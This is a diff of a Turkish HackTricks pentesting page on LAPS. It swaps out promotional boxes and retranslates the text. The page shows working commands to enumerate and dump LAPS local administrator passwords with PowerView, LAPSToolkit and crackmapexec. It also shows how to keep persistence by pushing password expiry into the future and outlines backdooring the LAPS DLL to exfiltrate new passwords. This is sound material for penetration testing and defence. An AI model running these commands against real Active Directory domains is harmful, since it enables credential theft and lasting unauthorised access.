@@ -1,16 +1,19 @@
 # LAPS
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin!</summary>
+<summary>Support HackTricks</summary>
 
-* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? Ya da en son PEASS sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* **[💬 Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) veya beni Twitter'da takip edin 🐦[@carlospolopm](https://twitter.com/hacktricks_live)**.
-* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya katkıda bulunun**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
@@ -19,11 +22,11 @@
 
 ## Temel Bilgiler
 
-Yerel Yönetici Parola Çözümü (LAPS), **yönetici parolalarının**, **benzersiz, rastgele ve sık sık değiştirilen** şekilde uygulandığı, etki alanına katılmış bilgisayarları yönetmek için kullanılan bir araçtır. Bu parolalar, Active Directory içinde güvenli bir şekilde depolanır ve yalnızca Erişim Kontrol Listeleri (ACL'ler) aracılığıyla izin verilen kullanıcılar tarafından erişilebilir. İstemci ile sunucu arasındaki parola iletimlerinin güvenliği, **Kerberos sürüm 5** ve **Gelişmiş Şifreleme Standardı (AES)** kullanılarak sağlanır.
+Local Administrator Password Solution (LAPS), **yönetici şifreleri**nin **eşsiz, rastgele ve sık sık değiştirildiği** bir sistemi yönetmek için kullanılan bir araçtır ve bu şifreler alan katılmış bilgisayarlara uygulanır. Bu şifreler, Active Directory içinde güvenli bir şekilde saklanır ve yalnızca Erişim Kontrol Listeleri (ACL'ler) aracılığıyla izin verilmiş kullanıcılara erişilebilir. İstemciden sunucuya şifre iletimlerinin güvenliği, **Kerberos sürüm 5** ve **Gelişmiş Şifreleme Standardı (AES)** kullanılarak sağlanır.
 
-LAPS'ın uygulanmasıyla etki alanının bilgisayar nesnelerinde, iki yeni özellik eklenir: **`ms-mcs-AdmPwd`** ve **`ms-mcs-AdmPwdExpirationTime`**. Bu özellikler, sırasıyla **düz metin yönetici parolasını** ve **son kullanma zamanını** depolar.
+Alan bilgisayar nesnelerinde, LAPS'ın uygulanması iki yeni niteliğin eklenmesiyle sonuçlanır: **`ms-mcs-AdmPwd`** ve **`ms-mcs-AdmPwdExpirationTime`**. Bu nitelikler, sırasıyla **düz metin yönetici şifresini** ve **şifrenin son kullanma tarihini** saklar.
 
-### Aktif olup olmadığını kontrol edin
+### Aktif olup olmadığını kontrol et
 ```bash
 reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
 
@@ -36,11 +39,11 @@ Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, 
 # Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
 Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
 ```
-### LAPS Şifre Erişimi
+### LAPS Parola Erişimi
 
-`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` adresinden **LAPS politikasının ham halini indirebilirsiniz** ve ardından bu dosyayı insan tarafından okunabilir formata dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketinde bulunan **`Parse-PolFile`** kullanılabilir.
+Ham LAPS politikasını `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` adresinden **indirebilir** ve ardından bu dosyayı insan tarafından okunabilir formata dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketinden **`Parse-PolFile`** kullanılabilir.
 
-Ayrıca, **yerel LAPS PowerShell cmdlet'leri** yüklü ise erişim sağladığımız bir makinede kullanılabilir:
+Ayrıca, erişim sağladığımız bir makinede yüklüyse **yerel LAPS PowerShell cmdlet'leri** de kullanılabilir:
 ```powershell
 Get-Command *AdmPwd*
 
@@ -61,7 +64,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 # Read the password
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
-**PowerView** ayrıca **kimin şifreyi okuyabileceğini ve okuyabileceğini** bulmak için kullanılabilir:
+**PowerView** ayrıca **şifrenin kimler tarafından okunabileceğini ve okunmasını** bulmak için de kullanılabilir:
 ```powershell
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
@@ -71,9 +74,9 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 ```
 ### LAPSToolkit
 
-[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit), LAPS'ın çeşitli işlevlerle numaralandırılmasını kolaylaştırır.\
-Bunlardan biri, **LAPS etkinleştirilmiş tüm bilgisayarlar için `ExtendedRights`'ın ayrıştırılmasıdır.** Bu, genellikle korunan gruplardaki kullanıcılar olan **LAPS şifrelerini okuma yetkisine sahip grupları** gösterecektir.\
-Bir **hesap**, bir bilgisayarı bir etki alanına **katıldığında**, o makine üzerinde `Tüm Extended Rights` alır ve bu hak, **hesaba şifreleri okuma** yeteneği verir. Numaralandırma, bir kullanıcı hesabının bir makinedeki LAPS şifresini okuyabilen bir hesabı gösterebilir. Bu, bize **LAPS şifrelerini okuyabilen belirli AD kullanıcılarını hedeflemede yardımcı olabilir.**
+The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) LAPS'in birkaç işlevle sayımını kolaylaştırır.\
+Bunlardan biri, **LAPS etkin olan tüm bilgisayarlar için `ExtendedRights`'ı** ayrıştırmaktır. Bu, genellikle korunan gruplardaki kullanıcılar olan **LAPS şifrelerini okumak için özel olarak yetkilendirilmiş grupları** gösterecektir.\
+Bir **hesap**, bir bilgisayarı bir domaine **katıldığında**, o ana bilgisayar üzerinde `All Extended Rights` alır ve bu hak, **hesaba** **şifreleri okuma** yeteneği verir. Sayım, bir ana bilgisayarda LAPS şifresini okuyabilen bir kullanıcı hesabını gösterebilir. Bu, LAPS şifrelerini okuyabilen **belirli AD kullanıcılarını hedeflememize** yardımcı olabilir.
 ```powershell
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -97,16 +100,18 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## **Crackmapexec ile LAPS Şifrelerinin Sızdırılması**
-Eğer bir PowerShell erişimi yoksa, bunu uzaktan LDAP aracılığıyla istismar edebilirsiniz.
+## **Dumping LAPS Passwords With Crackmapexec**
+Eğer bir powershell erişiminiz yoksa, bu yetkiyi LDAP üzerinden uzaktan kötüye kullanabilirsiniz.
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
-## **LAPS Kalıcılığı**
+Bu, kullanıcının okuyabileceği tüm şifreleri dökecek ve farklı bir kullanıcı ile daha iyi bir yer edinmenizi sağlayacaktır.
+
+## **LAPS Sürekliliği**
 
 ### **Son Kullanma Tarihi**
 
-Yönetici olduktan sonra, şifreleri almak ve bir makinenin şifresini güncellemesini engellemek için son kullanma tarihini geleceğe ayarlamak mümkündür.
+Bir kez yönetici olduğunuzda, **şifreleri elde etmek** ve bir makinenin **şifresini güncellemesini engellemek** için **son kullanma tarihini geleceğe ayarlamak** mümkündür.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -116,14 +121,14 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 {% hint style="warning" %}
-Şifre hala sıfırlanacak, eğer bir **yönetici** **`Reset-AdmPwdPassword`** komut dosyasını kullanırsa; veya **Politika tarafından gerekliden daha uzun şifre süresine izin verme** LAPS GPO'da etkinleştirilmişse.
+Şifre, bir **admin** **`Reset-AdmPwdPassword`** cmdlet'ini kullanırsa veya LAPS GPO'sunda **Şifre süresinin politika gereksinimlerinden daha uzun olmasına izin verme** seçeneği etkinse yine de sıfırlanacaktır.
 {% endhint %}
 
 ### Arka Kapı
 
-LAPS için orijinal kaynak kodu [burada](https://github.com/GreyCorbel/admpwd) bulunabilir, bu nedenle kod içine (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` yöntemine) bir arka kapı yerleştirmek mümkündür ve bu şekilde **yeni şifreleri dışarı çıkarabilir veya bir yerde depolayabilir**.
+LAPS'ın orijinal kaynak kodu [burada](https://github.com/GreyCorbel/admpwd) bulunabilir, bu nedenle kodda (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` yönteminde) bir arka kapı koymak mümkündür; bu, bir şekilde **yeni şifreleri dışarı sızdıracak veya bir yere depolayacaktır**.
 
-Ardından, yeni `AdmPwd.PS.dll` dosyasını derleyin ve `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` konumuna yükleyin (ve değişiklik zamanını değiştirin).
+Sonra, yeni `AdmPwd.PS.dll` dosyasını derleyin ve bunu `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` konumuna yükleyin (ve değiştirme zamanını değiştirin).
 
 ## Referanslar
 * [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
@@ -132,14 +137,17 @@ Ardından, yeni `AdmPwd.PS.dll` dosyasını derleyin ve `C:\Tools\admpwd\Main\Ad
 
 {% embed url="https://websec.nl/" %}
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Sıfırdan kahraman olana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizi HackTricks'te reklamını görmek ister misiniz? veya PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!**
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
-* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
-* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
-* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya katkıda bulunun.**
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**
 
 </details>
+{% endhint %}
